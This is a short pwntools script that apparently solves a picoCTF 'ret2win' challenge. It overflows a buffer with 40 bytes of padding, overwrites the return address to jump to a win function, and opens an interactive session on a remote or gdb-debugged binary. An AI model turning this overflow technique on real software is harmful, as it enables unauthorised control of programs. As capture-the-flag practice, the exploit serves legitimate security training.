from pwn import *
context.arch = 'amd64'
#context.binary = elf = ELF('./vuln')
if args.REMOTE:
    conn = remote('rhea.picoctf.net', 51236)
else:
    conn = gdb.debug('/home/mattia/Downloads/ret2win/ret2win', '''
       b *main
       c             
    ''')

ret_address = 0x400756

payload = b'A' * 32
payload += b'B' * 8
payload += p64(ret_address)

conn.sendafter(b'>', payload)

conn.interactive()